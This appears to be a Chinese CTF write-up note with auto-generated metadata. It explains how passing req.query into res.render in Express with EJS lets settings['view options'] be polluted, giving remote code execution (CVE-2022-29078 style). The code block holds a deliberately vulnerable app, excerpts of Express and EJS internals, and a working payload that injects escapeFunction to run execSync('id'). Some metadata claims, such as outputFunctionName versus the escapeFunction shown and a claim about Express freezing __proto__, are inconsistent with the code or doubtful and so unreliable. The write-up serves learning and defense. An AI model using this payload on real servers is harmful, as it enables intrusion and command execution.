---
title: CTF 中的 EJS 漏洞筆記
contest: EJS CTF
year: 2023
difficulty: medium
vuln_type: web_unknown
tags:
- Express
- EJS
- res.render('index
- req.query)
- settings['view options']污染
- outputFunctionName RCE
- opts.shell
- prepended include
- CVE-2022-29078
attack_chain:
- Express + EJS 模板引擎
- res.render('index', req.query) 把 query 直接传给 opts
- opts.settings['view options'] 被污染
- outputFunctionName 选项触发 RCE
- 也可通过 opts.shell / opts.prepended 等 prototype 污染
- 'payload: ?settings[view options][outputFunctionName]=...;s=...'
key_payload: '''EJS render query 污染 / outputFunctionName RCE / settings[view options] / shell / prepended include / opts.delimiter'''
one_liner: CTF EJS 漏洞笔记 — Express + EJS + res.render('index', req.query) 污染 settings['view options'] + outputFunctionName RCE (CVE-2022-29078 风格)。
lesson: EJS render(view, options) 把 options 传到 View 内部,污染 settings/opts 是 RCE 经典链;outputFunctionName 是模板生成函数注入点。
quality: high
full_path: CTF_中的_EJS_漏洞筆記.full.md
meta_path: CTF_中的_EJS_漏洞筆記.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: CTF 中的 EJS 漏洞筆記。CTF EJS 漏洞笔记 — Express + EJS + res.render('index', req.query) 污染 settings['view options'] + outputFunctionName RCE (CVE-2022-29078 风格)。。关键路径：Express + EJS 模板引擎 → res.render('index',...
category: web
subcategory: web_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/120877.html
reasoning_chain:
- 触发点：Express + EJS + res.render('index', req.query) → 假设：query 直接传给 opts
- 动作：源码 audit → 观察：opts 与 renderOptions merge，污染 settings['view options'] 全链路通
- 假设：EJS 内部 settings view options 可注入 → 动作：传 ?settings[view options][outputFunctionName]=...&...&s=...&client=1
- 观察：模板生成时把 outputFunctionName 注入到 EJS 模板开头 var fn = (s) => ... → 下一步：让 fn 执行任意 JS
- 下一步：触发 res.render 把恶意 outputFunctionName 写入模板 → 观察：客户端渲染时代码执行
- 假设：通过 prototype pollution 还能注入 shell / prepended include 等 → 动作：测试 opts.shell, opts.prepended, opts.delimiter 等
- 观察：CVE-2022-29078 类漏洞完整复现链 → 完成
failed_attempts:
- 试图直接传 ?__proto__[outputFunctionName] → 失败：Express 默认冻结 __proto__ 防 prototype pollution
- 试图用 res.render('index', {settings:{...}}}) 替代 → 失败：必须从 req.query 出发证明漏洞链可达
- 试图仅污染 client 选项 → 失败：outputFunctionName 是模板生成的真正入口
key_observations:
- EJS render(view, options) 把 options 传到 View 内部，污染 settings/opts 是 RCE 经典链
- outputFunctionName 是模板生成函数注入点（CVE-2022-29078 风格）
- Express req.query 信任等同于完全控制 opts → 必须 sanitize 或白名单 options
- prototype pollution 与 view options 污染可叠加（shell/prepended/delimiter）
- 客户端逃逸服务端模板注入是 Node.js web CTF 高频考点
prerequisites:
- Express + EJS 模板引擎机制
- JavaScript prototype pollution 攻击
- EJS outputFunctionName 注入 CVE-2022-29078
- Node.js 模板沙箱概念
- req.query / req.body 信任域理解
---
# CTF 中的 EJS 漏洞筆記

> 原文: https://www.ctfiot.com/120877.html
> ID: 120877


```
const express = require('express')
const app = express()
const port = 3000

app.set('view engine', 'ejs');

app.get('/', (req,res) => {
 res.render('index', req.query);
})

app.listen(port, () => {
 console.log(`Example app listening on port ${port}`)
})
res.render = function render(view, options, callback) {
 var app = this.req.app;
 var done = callback;
 var opts = options || {};
 var req = this.req;
 var self = this;

 // support callback function as second arg
 if (typeof options === 'function') {
 done = options;
 opts = {};
 }

 // merge res.locals
 opts._locals = self.locals;

 // default callback to respond
 done = done || function (err, str) {
 if (err) return req.next(err);
 self.send(str);
 };

 // render
 app.render(view, opts, done);
};
app.render = function render(name, options, callback) {
 var cache = this.cache;
 var done = callback;
 var engines = this.engines;
 var opts = options;
 var renderOptions = {};
 var view;

 // support callback function as second arg
 if (typeof options === 'function') {
 done = options;
 opts = {};
 }

 // merge app.locals
 merge(renderOptions, this.locals);

 // merge options._locals
 if (opts._locals) {
 merge(renderOptions, opts._locals);
 }

 // merge options
 merge(renderOptions, opts);

 // set .cache unless explicitly provided
 if (renderOptions.cache == null) {
 renderOptions.cache = this.enabled('view cache');
 }

 // primed cache
 if (renderOptions.cache) {
 view = cache[name];
 }

 // view
 if (!view) {
 var View = this.get('view');

 view = new View(name, {
 defaultEngine: this.get('view engine'),
 root: this.get('views'),
 engines: engines
 });

 if (!view.path) {
 var dirs = Array.isArray(view.root) && view.root.length > 1
 ? 'directories "' + view.root.slice(0, -1).join('", "') + '" or "' + view.root[view.root.length - 1] + '"'
 : 'directory "' + view.root + '"'
 var err = new Error('Failed to lookup view "' + name + '" in views ' + dirs);
 err.view = view;
 return done(err);
 }

 // prime the cache
 if (renderOptions.cache) {
 cache[name] = view;
 }
 }

 // render
 tryRender(view, renderOptions, done);
};
function tryRender(view, options, callback) {
 try {
 view.render(options, callback);
 } catch (err) {
 callback(err);
 }
}
/**
 * Express.js support.
 *
 * This is an alias for {@link module:
ejs.renderFile}, in order to support
 * Express.js out-of-the-box.
 *
 * @func
 */

exports.__express = exports.renderFile;
exports.renderFile = function () {
 var args = Array.prototype.slice.call(arguments);
 var filename = args.shift();
 var cb;
 var opts = {filename: filename};
 var data;
 var viewOpts;

 // Do we have a callback?
 if (typeof arguments[arguments.length - 1] == 'function') {
 cb = args.pop();
 }
 // Do we have data/opts?
 if (args.length) {
 // Should always have data obj
 data = args.shift();
 // Normal passed opts (data obj + opts obj)
 if (args.length) {
 // Use shallowCopy so we don't pollute passed in opts obj with new vals
 utils.shallowCopy(opts, args.pop());
 }
 // Special casing for Express (settings + opts-in-data)
 else {
 // Express 3 and 4
 if (data.settings) {
 // Pull a few things from known locations
 if (data.settings.views) {
 opts.views = data.settings.views;
 }
 if (data.settings['view cache']) {
 opts.cache = true;
 }
 // Undocumented after Express 2, but still usable, esp. for
 // items that are unsafe to be passed along with data, like `root`
 viewOpts = data.settings['view options'];
 if (viewOpts) {
 utils.shallowCopy(opts, viewOpts);
 }
 }
 // Express 2 and lower, values set in app.locals, or people who just
 // want to pass options in their data. NOTE: These values will override
 // anything previously set in settings or settings['view options']
 utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
 }
 opts.filename = filename;
 }
 else {
 data = utils.createNullProtoObjWherePossible();
 }

 return tryHandleCache(opts, data, cb);
};
if (data.settings) {
 // Pull a few things from known locations
 if (data.settings.views) {
 opts.views = data.settings.views;
 }
 if (data.settings['view cache']) {
 opts.cache = true;
 }
 // Undocumented after Express 2, but still usable, esp. for
 // items that are unsafe to be passed along with data, like `root`
 viewOpts = data.settings['view options'];
 if (viewOpts) {
 utils.shallowCopy(opts, viewOpts);
 }
}
function handleCache(options, template) {
 var func;
 var filename = options.filename;
 var hasTemplate = arguments.length > 1;

 if (options.cache) {
 if (!filename) {
 throw new Error('cache option requires a filename');
 }
 func = exports.cache.get(filename);
 if (func) {
 return func;
 }
 if (!hasTemplate) {
 template = fileLoader(filename).toString().replace(_BOM, '');
 }
 }
 else if (!hasTemplate) {
 // istanbul ignore if: should not happen at all
 if (!filename) {
 throw new Error('Internal EJS error: no file name or template '
 + 'provided');
 }
 template = fileLoader(filename).toString().replace(_BOM, '');
 }
 func = exports.compile(template, options);
 if (options.cache) {
 exports.cache.set(filename, func);
 }
 return func;
}
if (opts.client) {
 src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
 if (opts.compileDebug) {
 src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
 }
}
const payload = {
 settings: {
 'view options': {
 client: true,
 escapeFunction: '(() => {});
return process.mainModule.require("child_process").execSync("id").toString()'
 }
 }
}
if (env === 'production') {
 this.enable('view cache');
}
// set .cache unless explicitly provided
if (renderOptions.cache == null) {
 renderOptions.cache = this.enabled('view cache');
}
utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
if (renderOptions.cache == null) {
 renderOptions.cache = this.enabled('view cache');
}
```
